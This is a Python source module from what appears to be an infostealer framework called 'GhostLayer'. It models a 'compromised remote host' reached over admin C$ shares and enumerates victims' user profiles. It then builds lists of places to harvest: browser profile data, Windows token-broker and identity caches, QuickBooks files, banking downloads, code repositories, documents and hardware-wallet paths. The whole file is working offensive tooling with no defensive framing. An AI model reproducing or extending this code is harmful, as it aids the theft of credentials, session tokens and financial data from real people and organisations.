"""
ghost_layer_remote.py
=====================
Remote Target Context & Adapters for GhostLayer Financial & Credential Collectors.

Provides `RemoteTargetContext` to adapt path resolution and file inspection
across remote network shares (e.g. \\\\<host>\\C$ or mounted UNC targets),
transparently mapping user directories into target-specific TargetIdentity profiles.
"""

from __future__ import annotations

import logging
import os
import platform
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional

logger = logging.getLogger("GhostLayer.Remote")


@dataclass
class RemoteTargetContext:
    """
    Encapsulates the connection and filesystem paths of a compromised remote host.
    """
    host: str
    target_id: Optional[str] = None
    share_root: Path = field(default_factory=lambda: Path(r"C$"))
    user_names: List[str] = field(default_factory=list)
    privilege_level: str = "admin"
    domain_role: str = "workstation"

    def __post_init__(self):
        if not self.target_id:
            self.target_id = f"remote:{self.host}"
        if isinstance(self.share_root, str):
            self.share_root = Path(self.share_root)

    @property
    def unc_prefix(self) -> Path:
        """Construct the UNC root, e.g. \\\\host\\C$"""
        if str(self.share_root).startswith(r"\\"):
            return self.share_root
        return Path(fr"\\{self.host}\{self.share_root}")

    @property
    def users_dir(self) -> Path:
        """Returns the remote Users directory path."""
        return self.unc_prefix / "Users"

    def get_user_profiles(self) -> List[Path]:
        """
        Discovers active user profiles on the remote target.
        """
        profiles: List[Path] = []
        if self.user_names:
            for u in self.user_names:
                profiles.append(self.users_dir / u)
            return profiles

        # Try to enumerate \\host\C$\Users
        if self.users_dir.is_dir():
            try:
                for item in self.users_dir.iterdir():
                    if item.is_dir() and item.name.lower() not in (
                        "public", "default", "default user", "all users"
                    ):
                        profiles.append(item)
            except Exception as exc:
                logger.debug("Failed enumerating remote users on %s: %s", self.host, exc)

        if not profiles:
            # Fallback to Public or default guess
            profiles.append(self.users_dir / "Administrator")

        return profiles

    def get_search_roots(self) -> Dict[str, List[Path]]:
        """
        Generates remote search roots for all discovered user profiles.
        """
        roots: Dict[str, Any] = {
            "browser_roots": [],
            "electron_roots": {},
            "wam_roots": [],
            "erp_roots": [
                self.unc_prefix / "Users" / "Public" / "Documents" / "Intuit" / "QuickBooks",
                self.unc_prefix / "ProgramData" / "Intuit" / "QuickBooks",
            ],
            "banking_roots": [
                self.unc_prefix / "Users" / "Public" / "Downloads",
            ],
            "source_roots": [],
            "doc_roots": [
                self.unc_prefix / "Users" / "Public" / "Documents",
            ],
            "hw_wallet_paths": {},
        }

        for profile in self.get_user_profiles():
            appdata_local = profile / "AppData" / "Local"
            appdata_roaming = profile / "AppData" / "Roaming"

            # Browser roots
            roots["browser_roots"].extend([
                appdata_local / "Google" / "Chrome" / "User Data",
                appdata_local / "Microsoft" / "Edge" / "User Data",
                appdata_local / "BraveSoftware" / "Brave-Browser" / "User Data",
            ])

            # WAM roots
            roots["wam_roots"].extend([
                appdata_local / "Microsoft" / "Windows" / "CloudAP",
                appdata_local / "Microsoft" / "TokenBroker" / "Cache",
                appdata_local / "Microsoft" / "IdentityCache",
                profile / ".IdentityService",
            ])

            # ERP roots per user
            roots["erp_roots"].append(profile / "Documents" / "Intuit" / "QuickBooks")

            # Banking roots
            roots["banking_roots"].extend([
                profile / "Downloads",
                profile / "Desktop",
                profile / "Documents",
            ])

            # Source / dev roots
            roots["source_roots"].extend([
                profile / "repos",
                profile / "projects",
                profile / "code",
                profile / "dev",
                profile / "Documents",
            ])

            # Doc roots
            roots["doc_roots"].extend([
                profile / "Downloads",
                profile / "Desktop",
                profile / "Documents",
                profile / "OneDrive",
            ])

        return roots
